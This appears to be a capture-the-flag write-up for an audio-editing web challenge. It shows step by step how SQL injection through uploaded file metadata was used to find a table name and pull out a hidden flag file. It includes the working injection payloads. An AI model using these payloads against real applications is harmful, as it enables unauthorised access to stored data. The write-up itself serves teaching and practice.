Problem:

I made a cool site to edit audio files. Can you exploit it?
Link[http://107.170.122.6/audioedit/index.php]

Writeup:

- Metadata is uploaded to the site alongside the file
- We can sql inject through the metadata
- The metadata is likely in the insert clause
	- INSERT INTO table_name VALUES (value1,value2...)
- Changing the metadata of artist to:
	- test1','test2') # 
- results in both the artist value and title value changing
- We can now figure out the table name as we know 'file' is a column name
	- test', (SELECT table_name FROM information_schema.columns WHERE column name = "file")) # 
- Now, we simply list out the first file from table 'audioedit'
	- test',(SELECT file FROM (SELECT * FROM audioedit) AS x limit 0,1)) #
- We get the file supersecretflagf1le.mp3
- Going to http://107.170.122.6/audioedit/edit.php?file=supersecretflagf1le.mp3
and changing the visualisation to sonogram gives us the flag.
